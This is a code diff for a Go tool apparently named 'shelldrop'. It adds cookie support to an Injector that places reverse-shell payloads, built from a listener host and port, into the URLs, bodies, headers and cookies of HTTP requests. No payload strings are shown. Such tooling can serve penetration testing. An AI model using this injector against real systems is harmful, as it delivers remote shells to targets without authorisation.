@@ -2,9 +2,9 @@ package main
 
 import (
 	"context"
+	"fmt"
 	"io"
 	"net/http"
-	"shelldrop/log"
 	"shelldrop/payloads"
 	"strings"
 	"time"
@@ -18,6 +18,7 @@ type (
 		url            string
 		data           string
 		headers        map[string]string
+		cookies        map[string]string
 	}
 )
 
@@ -28,8 +29,6 @@ func NewInjector(payloadName string) *Injector {
 }
 
 func (i *Injector) Do(ctx context.Context) error {
-	log.Infof("Testing %s", i.payloadName)
-
 	url := i.setPayloadUrlEncoded(i.url)
 	var body io.Reader = nil
 
@@ -50,9 +49,17 @@ func (i *Injector) Do(ctx context.Context) error {
 		return err
 	}
 
-	if i.headers != nil {
+	if i.hasHeaders() {
 		for k, v := range i.headers {
 			req.Header.Set(k, i.setPayload(v))
+		}
+	}
+	if i.hasCookies() {
+		for k, v := range i.cookies {
+			cookie, err := http.ParseSetCookie(fmt.Sprintf("%s=%s", k, i.setPayload(v)))
+			if err == nil {
+				req.AddCookie(cookie)
+			}
 		}
 	}
 
@@ -99,8 +106,21 @@ func (i *Injector) WithHeaders(headers map[string]string) *Injector {
 	return i
 }
 
+func (i *Injector) WithCookies(cookies map[string]string) *Injector {
+	i.cookies = cookies
+	return i
+}
+
 func (i *Injector) hasData() bool {
 	return i.data != ""
+}
+
+func (i *Injector) hasHeaders() bool {
+	return i.headers != nil
+}
+
+func (i *Injector) hasCookies() bool {
+	return i.cookies != nil
 }
 
 func (i *Injector) hasHeader(name string) bool {
@@ -108,6 +128,7 @@ func (i *Injector) hasHeader(name string) bool {
 	return ok
 }
 
+// todo: create proper validator/sanitizer for payloads
 func (i *Injector) setPayload(value string) string {
 	payload := payloads.Get(i.payloadName, i.listenerConfig.Host, i.listenerConfig.Port)
 	return strings.Replace(value, ShellDropKeyword, payload, -1)
